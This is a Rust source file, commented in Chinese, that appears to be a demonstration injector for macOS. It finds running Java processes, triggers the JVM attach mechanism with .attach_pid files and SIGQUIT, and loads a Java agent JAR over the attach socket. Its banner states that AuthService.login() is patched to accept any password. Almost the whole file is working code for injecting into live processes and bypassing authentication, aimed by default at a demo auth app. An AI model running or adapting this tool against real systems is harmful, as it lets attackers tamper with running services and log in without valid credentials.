//! Rust 注入助手 — 利用 macOS 底层特性 + JVM Attach Protocol
//!
//! 工作流程:
//! 1. 使用 macOS libproc 扫描所有进程，找到 Java/Spring Boot 进程
//! 2. 通过 JVM Attach Protocol (UNIX socket) 连接到目标 JVM
//! 3. 发送 "load" 命令将 Java Agent JAR 注入目标 JVM
//! 4. Agent 在目标 JVM 内修改 AuthService.login() 的字节码

use std::ffi::CStr;
use std::fs;
use std::io::{Read, Write};
use std::os::unix::net::UnixStream;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::thread;
use std::time::Duration;

// ── macOS libproc 绑定 ───────────────────────────────────────────────

const PROC_ALL_PIDS: u32 = 1;
const MAX_PIDS: usize = 4096;

extern "C" {
    fn proc_listpids(type_: u32, typeinfo: u32, buffer: *mut libc::c_void, buffersize: u32) -> i32;
    fn proc_pidinfo(
        pid: i32,
        flavor: u32,
        arg: u64,
        buffer: *mut libc::c_void,
        buffersize: i32,
    ) -> i32;
    fn proc_name(pid: i32, buffer: *mut libc::c_char, buffersize: u32) -> i32;
}

const PROC_PIDPATHINFO: u32 = 11;
const PROC_PIDPATHINFO_MAXSIZE: usize = 4096;

#[repr(C)]
struct ProcPidPath {
    path: [libc::c_char; PROC_PIDPATHINFO_MAXSIZE],
}

// ── 临时目录发现 ─────────────────────────────────────────────────────

/// 收集所有可能的临时目录 (macOS 上 TMPDIR 通常是 /var/folders/xx/xxx/T/)
fn collect_tmp_dirs() -> Vec<PathBuf> {
    let mut dirs = vec![
        PathBuf::from("/tmp"),
        PathBuf::from("/private/tmp"),
    ];

    // 当前进程的 TMPDIR (同一用户运行，与目标 JVM 的 TMPDIR 相同)
    if let Ok(tmpdir) = std::env::var("TMPDIR") {
        let p = PathBuf::from(&tmpdir);
        if !dirs.contains(&p) {
            dirs.push(p);
        }
    }

    dirs
}

// ── 进程发现 ─────────────────────────────────────────────────────────

struct ProcessInfo {
    pid: i32,
    name: String,
    path: String,
}

fn list_java_processes() -> Vec<ProcessInfo> {
    let mut pids: Vec<i32> = vec![0; MAX_PIDS];
    let size = unsafe {
        proc_listpids(
            PROC_ALL_PIDS,
            0,
            pids.as_mut_ptr() as *mut libc::c_void,
            (MAX_PIDS * std::mem::size_of::<i32>()) as u32,
        )
    };

    if size <= 0 {
        eprintln!("[!] proc_listpids failed");
        return vec![];
    }

    let count = (size as usize) / std::mem::size_of::<i32>();
    let mut results = Vec::new();

    for &pid in &pids[..count] {
        if pid == 0 {
            continue;
        }

        let mut name_buf = [0i8; 256];
        let name_len = unsafe { proc_name(pid, name_buf.as_mut_ptr(), 256) };
        if name_len <= 0 {
            continue;
        }
        let name = unsafe { CStr::from_ptr(name_buf.as_ptr()) }
            .to_string_lossy()
            .into_owned();

        let mut path_info = ProcPidPath {
            path: [0i8; PROC_PIDPATHINFO_MAXSIZE],
        };
        let info_size = unsafe {
            proc_pidinfo(
                pid,
                PROC_PIDPATHINFO,
                0,
                &mut path_info as *mut ProcPidPath as *mut libc::c_void,
                std::mem::size_of::<ProcPidPath>() as i32,
            )
        };
        let path = if info_size > 0 {
            unsafe { CStr::from_ptr(path_info.path.as_ptr()) }
                .to_string_lossy()
                .into_owned()
        } else {
            String::new()
        };

        if name.contains("java")
            || path.contains("/java")
            || path.contains("/javaw")
        {
            results.push(ProcessInfo { pid, name, path });
        }
    }

    results
}

// ── JVM Attach Protocol 实现 ─────────────────────────────────────────

/// 获取进程工作目录 (通过 lsof 解析 fcwd 条目)
fn get_process_cwd(pid: i32) -> Option<String> {
    let output = Command::new("lsof")
        .args(["-p", &pid.to_string(), "-Fn"])
        .output()
        .ok()?;

    if !output.status.success() {
        return None;
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut last_fd: Option<String> = None;

    for line in stdout.lines() {
        if line.starts_with('f') {
            last_fd = Some(line[1..].to_string());
        } else if line.starts_with('n') && last_fd.as_deref() == Some("cwd") {
            let path = &line[1..];
            if Path::new(path).is_dir() {
                return Some(path.to_string());
            }
        }
    }

    // Fallback: 取第一个目录
    for line in stdout.lines() {
        if line.starts_with('n') {
            let path = &line[1..];
            if Path::new(path).is_dir() && !path.contains("(stat)") {
                return Some(path.to_string());
            }
        }
    }

    None
}

/// 触发 JVM Attach Listener: 在所有可能的目录创建 .attach_pid{PID} 文件
/// 然后发送 SIGQUIT 信号让 JVM 启动 Attach Listener
fn trigger_attach(pid: i32) -> Result<(), String> {
    let attach_file_name = format!(".attach_pid{}", pid);
    let tmp_dirs = collect_tmp_dirs();

    // 获取进程工作目录
    let cwd = get_process_cwd(pid);
    println!("[*] Target cwd: {}", cwd.as_deref().unwrap_or("(unknown)"));
    println!("[*] Searching temp dirs: {:?}", tmp_dirs.iter().map(|p| p.display().to_string()).collect::<Vec<_>>());

    // 在所有可能的位置创建 .attach_pid 文件
    let mut created_locations: Vec<String> = Vec::new();

    // 1. 进程工作目录 (JVM 优先检查的位置)
    if let Some(ref cwd) = cwd {
        let p = format!("{}/{}", cwd, attach_file_name);
        match fs::File::create(&p) {
            Ok(mut f) => {
                let _ = f.write_all(pid.to_string().as_bytes());
                created_locations.push(p);
            }
            Err(e) => println!("[!] Cannot write to cwd: {}", e),
        }
    }

    // 2. 所有临时目录
    for dir in &tmp_dirs {
        let p = dir.join(&attach_file_name);
        match fs::File::create(&p) {
            Ok(mut f) => {
                let _ = f.write_all(pid.to_string().as_bytes());
                created_locations.push(p.to_string_lossy().into_owned());
            }
            Err(e) => println!("[!] Cannot write to {}: {}", p.display(), e),
        }
    }

    println!("[*] Created attach trigger files in {} locations", created_locations.len());
    for loc in &created_locations {
        println!("    {}", loc);
    }

    // 发送 SIGQUIT 信号触发 JVM 检查 .attach_pid 文件
    let ret = unsafe { libc::kill(pid, libc::SIGQUIT) };
    if ret != 0 {
        let err = std::io::Error::last_os_error();
        return Err(format!("kill(SIGQUIT) failed for pid {}: {}", pid, err));
    }
    println!("[+] SIGQUIT sent to pid {}", pid);

    Ok(())
}

/// 等待 JVM Attach Listener 的 UNIX socket 出现
/// macOS 上 socket 在 TMPDIR/.java_pid{PID}，不在 /tmp
fn wait_for_attach_socket(pid: i32, timeout_secs: u64) -> Result<String, String> {
    let socket_name = format!(".java_pid{}", pid);
    let tmp_dirs = collect_tmp_dirs();
    let start = std::time::Instant::now();
    let mut attempts = 0u32;

    while start.elapsed() < Duration::from_secs(timeout_secs) {
        attempts += 1;

        // 1. 直接检查所有已知临时目录
        for dir in &tmp_dirs {
            let socket_path = dir.join(&socket_name);
            if socket_path.exists() {
                return Ok(socket_path.to_string_lossy().into_owned());
            }
        }

        // 2. 使用 find 在整个 /var/folders 和 /tmp 下搜索
        if attempts % 5 == 0 {
            if let Ok(output) = Command::new("find")
                .args([
                    "/var/folders", "/tmp", "/private/tmp",
                    "-name", &socket_name,
                ])
                .output()
            {
                let found = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if !found.is_empty() {
                    // 可能有多行，取第一个
                    if let Some(first) = found.lines().next() {
                        return Ok(first.to_string());
                    }
                }
            }
        }

        // 3. 使用 lsof 查找目标进程打开的 UNIX socket
        if attempts % 10 == 0 {
            if let Ok(output) = Command::new("lsof")
                .args(["-p", &pid.to_string(), "-U", "-Fn"])
                .output()
            {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines() {
                    if line.starts_with('n') && line.contains(&socket_name) {
                        return Ok(line[1..].to_string());
                    }
                }
            }
        }

        thread::sleep(Duration::from_millis(300));
    }

    // 最终诊断
    println!("\n[DIAGNOSTIC] Socket search failed after {} attempts ({}s)", attempts, timeout_secs);
    println!("[DIAGNOSTIC] Searched directories:");
    for dir in &tmp_dirs {
        println!("    {} (exists: {})", dir.display(), dir.exists());
    }

    // 检查 .attach_pid 文件是否还存在
    for dir in &tmp_dirs {
        let attach_file = dir.join(format!(".attach_pid{}", pid));
        println!("[DIAGNOSTIC] {} exists: {}", attach_file.display(), attach_file.exists());
    }

    // 尝试用 find 做最后一次全局搜索
    println!("[DIAGNOSTIC] Running final global search...");
    if let Ok(output) = Command::new("find")
        .args(["/tmp", "/var", "/private", "-name", &socket_name, "-maxdepth", "6"])
        .output()
    {
        let found = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if found.is_empty() {
            println!("[DIAGNOSTIC] No .java_pid{} socket found anywhere", pid);
        } else {
            println!("[DIAGNOSTIC] Found: {}", found);
        }
    }

    Err(format!(
        "Attach socket .java_pid{} not found after {}s.\n\
         Possible causes:\n\
         - JVM started with -XX:+DisableAttachMechanism\n\
         - Different user / SIP restrictions\n\
         - JDK does not support dynamic attach (use GraalVM/OpenJDK)\n\
         \n\
         Workaround: start with -javaagent flag instead (see below)",
        pid, timeout_secs
    ))
}

/// 通过 JVM Attach Protocol 发送命令并读取响应
fn send_attach_command(socket_path: &str, command: &str, args: &[&str]) -> Result<String, String> {
    let mut stream = UnixStream::connect(socket_path)
        .map_err(|e| format!("Connect to {} failed: {}", socket_path, e))?;

    // JVM Attach Protocol:
    // <PROTOCOL_VERSION>\0<command>\0<arg1>\0<arg2>\0...
    let mut msg = format!("1\0{}\0", command);
    for arg in args {
        msg.push_str(arg);
        msg.push('\0');
    }

    stream
        .write_all(msg.as_bytes())
        .map_err(|e| format!("Write failed: {}", e))?;
    stream
        .flush()
        .map_err(|e| format!("Flush failed: {}", e))?;

    // 读取响应
    let mut buf = vec![0u8; 4096];
    let mut total = Vec::new();

    // 设置超时避免永久阻塞
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .ok();

    loop {
        match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => total.extend_from_slice(&buf[..n]),
            Err(_) => break,
        }
    }

    Ok(String::from_utf8_lossy(&total).to_string())
}

/// 加载 Java Agent 到目标 JVM
fn load_agent(pid: i32, agent_jar_path: &str, agent_args: &str) -> Result<String, String> {
    println!("[*] Triggering JVM attach for pid {}...", pid);
    trigger_attach(pid)?;

    println!("[*] Waiting for Attach Listener socket...");
    let socket_path = wait_for_attach_socket(pid, 15)?;
    println!("[+] Found attach socket: {}", socket_path);

    thread::sleep(Duration::from_millis(500));

    println!("[*] Loading agent: {}", agent_jar_path);
    let agent_payload = if agent_args.is_empty() {
        agent_jar_path.to_string()
    } else {
        format!("{}={}", agent_jar_path, agent_args)
    };

    let result = send_attach_command(&socket_path, "load", &["instrument", "false", &agent_payload])?;
    Ok(result)
}

// ── 辅助 ─────────────────────────────────────────────────────────────

fn print_startup_hint(agent_jar: &str) {
    println!("\n── 备选方案: 启动时加载 Agent ──");
    println!("如果动态 Attach 失败，可以在启动 Java 应用时直接加载 Agent:\n");
    println!("  java -javaagent:{} -jar auth-app-1.0.0.jar", agent_jar);
    println!();
}

fn print_banner() {
    println!(r#"
 ╔══════════════════════════════════════════════════════════╗
 ║               Rust Bytecode Injector v1.0               ║
 ║          macOS Process Attach + JVM Agent Load           ║
 ╚══════════════════════════════════════════════════════════╝
"#);
}

fn get_process_cmdline(pid: i32) -> Option<String> {
    let output = Command::new("ps")
        .args(["-p", &pid.to_string(), "-o", "command="])
        .output()
        .ok()?;

    if output.status.success() {
        Some(String::from_utf8_lossy(&output.stdout).trim().to_string())
    } else {
        None
    }
}

fn truncate_str(s: &str, max_len: usize) -> &str {
    if s.len() <= max_len { s } else { &s[..max_len] }
}

// ── 主流程 ───────────────────────────────────────────────────────────

fn main() {
    print_banner();

    let args: Vec<String> = std::env::args().collect();

    let agent_jar = if args.len() > 1 {
        args[1].clone()
    } else {
        let exe_dir = std::env::current_exe()
            .ok()
            .and_then(|p| p.parent().map(|d| d.to_path_buf()))
            .unwrap_or_else(|| PathBuf::from("."));

        let default = exe_dir.join("inject-agent-1.0.0.jar");
        if default.exists() {
            default.to_string_lossy().into_owned()
        } else {
            let project_path = "java-agent/target/inject-agent-1.0.0.jar";
            if Path::new(project_path).exists() {
                project_path.to_string()
            } else {
                std::env::current_dir()
                    .map(|d| d.join(project_path))
                    .unwrap_or_else(|_| PathBuf::from(project_path))
                    .to_string_lossy()
                    .into_owned()
            }
        }
    };

    let agent_jar = if Path::new(&agent_jar).is_absolute() {
        agent_jar
    } else {
        std::env::current_dir()
            .map(|d| d.join(&agent_jar))
            .unwrap_or_else(|_| Path::new(&agent_jar).to_path_buf())
            .to_string_lossy()
            .into_owned()
    };

    if !Path::new(&agent_jar).exists() {
        eprintln!("[!] Agent JAR not found: {}", agent_jar);
        eprintln!("[!] Build it first: cd java-agent && mvn clean package");
        print_startup_hint(&agent_jar);
        std::process::exit(1);
    }

    println!("[*] Agent JAR: {}", agent_jar);
    println!("[*] TMPDIR: {}", std::env::var("TMPDIR").unwrap_or_else(|_| "(not set)".into()));
    println!("[*] Scanning for Java processes...\n");

    let java_procs = list_java_processes();

    if java_procs.is_empty() {
        eprintln!("[!] No Java processes found!");
        eprintln!("[!] Start the Spring Boot app first:");
        eprintln!("    cd java-app && mvn spring-boot:run");
        print_startup_hint(&agent_jar);
        std::process::exit(1);
    }

    println!("Found {} Java process(es):", java_procs.len());
    println!("{:-<60}", "");
    for (i, proc) in java_procs.iter().enumerate() {
        let cmd = get_process_cmdline(proc.pid);
        println!("  [{}] PID: {:>6} | {}", i + 1, proc.pid, proc.name);
        if let Some(cmdline) = &cmd {
            if cmdline.contains("auth") || cmdline.contains("spring") || cmdline.contains("geek") {
                println!("           >>> Likely target: {}", truncate_str(cmdline, 80));
            }
        }
        if !proc.path.is_empty() {
            println!("           Path: {}", truncate_str(&proc.path, 80));
        }
        println!();
    }

    let target = if java_procs.len() == 1 {
        &java_procs[0]
    } else {
        let auth_proc = java_procs.iter().find(|p| {
            let cmd = get_process_cmdline(p.pid).unwrap_or_default();
            cmd.contains("auth") || cmd.contains("geek")
        });
        match auth_proc {
            Some(p) => { println!("[+] Auto-selected auth process (PID: {})", p.pid); p }
            None => { println!("[*] Selecting first Java process (PID: {})", java_procs[0].pid); &java_procs[0] }
        }
    };

    println!("\n[*] Target PID: {}", target.pid);
    println!("[*] Injecting agent...\n");

    match load_agent(target.pid, &agent_jar, "") {
        Ok(response) => {
            if response.contains("return code") {
                println!("[+] Agent load response: {}", response.trim());
            } else {
                println!("[+] Agent loaded successfully!");
            }

            println!(r#"
 ╔══════════════════════════════════════════════════════════╗
 ║                  INJECTION SUCCESSFUL                    ║
 ╠══════════════════════════════════════════════════════════╣
 ║                                                          ║
 ║  AuthService.login() has been patched!                   ║
 ║  Any password will now be accepted.                      ║
 ║                                                          ║
 ║  Try: curl -X POST http://localhost:8080/api/login \     ║
 ║       -d 'username=admin&password=anything'              ║
 ║                                                          ║
 ╚══════════════════════════════════════════════════════════╝
"#);
        }
        Err(e) => {
            eprintln!("[!] Agent injection failed: {}", e);
            print_startup_hint(&agent_jar);
            std::process::exit(1);
        }
    }
}
